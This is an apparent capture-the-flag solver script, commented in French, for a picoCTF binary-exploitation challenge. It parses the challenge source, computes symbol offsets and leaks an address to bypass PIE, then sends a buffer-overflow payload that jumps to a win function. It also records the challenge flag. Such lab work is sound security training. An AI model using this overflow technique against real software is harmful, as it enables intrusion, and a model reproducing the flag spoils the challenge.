# 733 - offset-cycle  (Binary Exploitation, picoCTF 2026)
# Flag: academy{u_Us3d_pwNt00L5_af37c96d}
# Write-up: ../../../writeups/binary-exploitation/733-offset-cycle.md
# Script exact utilise pour produire le flag.
#
import sys, subprocess, re, os, glob, time

# execute a la distance : ./start, parse le source, calcule l'offset, exploite
src = r'''
import subprocess, re, sys, os, glob, struct

os.chdir(os.path.expanduser("~"))
subprocess.run(["./start"], capture_output=True, timeout=30)
cs = sorted(glob.glob("*.c"), key=os.path.getmtime)
if not cs:
    print("pas de .c"); sys.exit(1)
srcfile = cs[-1]
binname = srcfile[:-2]
code = open(srcfile).read()
m = re.search(r"#define\s+BUFSIZE\s+(\d+)", code)
bufsize = int(m.group(1)) if m else 78
print("src:", srcfile, "bin:", binname, "BUFSIZE:", bufsize)

# offsets
nm = subprocess.run(["nm", binname], capture_output=True, text=True).stdout
off = {}
for line in nm.splitlines():
    parts = line.split()
    if len(parts) == 3 and parts[1] in ("T", "t"):
        off[parts[2]] = int(parts[0], 16)
win_off = off.get("win")
vuln_off = off.get("vuln")
main_off = off.get("main")
print("win:", hex(win_off) if win_off else None, "vuln:", hex(vuln_off) if vuln_off else None)

# adresse de retour dans main : call vuln + 5
dis = subprocess.run(["objdump", "-d", "-Mintel", binname], capture_output=True, text=True).stdout
ret_off = None
inmain = False
lines = dis.splitlines()
for i, line in enumerate(lines):
    if "<main>:" in line:
        inmain = True
        continue
    if inmain and re.match(r"^[0-9a-f]+ <", line):
        break
    if inmain and "call" in line and "vuln" in line:
        a = int(line.split(":")[0].strip(), 16)
        ret_off = a + 5
        break
print("ret_off:", hex(ret_off) if ret_off else None)

# lancer le binaire pour le leak
p = subprocess.Popen(["./" + binname], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
time.sleep(0.3)
# envoyer une premiere ligne pour declencher le printf
p.stdin.write("A\n")
p.stdin.flush()
time.sleep(0.5)
out = ""
try:
    p.stdin.write("B\n")
    p.stdin.flush()
except Exception:
    pass
time.sleep(0.5)
try:
    out = p.stdout.read()
except Exception:
    pass
print("sortie:", out[:300])
m2 = re.search(r"0x([0-9a-f]+)", out)
if not m2:
    print("pas de leak"); sys.exit(1)
leak = int(m2.group(1), 16)
win_addr = leak - ret_off + win_off
print("leak:", hex(leak), "win:", hex(win_addr))

# deuxieme execution : exploit
payload = b"A" * bufsize + b"B" * 8 + struct.pack("<Q", win_addr)
p2 = subprocess.Popen(["./" + binname], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
p2.stdin.write(payload + b"\n")
p2.stdin.flush()
p2.stdin.close()
try:
    res = p2.stdout.read()
except Exception:
    res = b""
print("=== RESULTAT ===")
print(res.decode("utf-8", "replace")[:500])
'''
open("/tmp/exp733.py", "w").write(src)
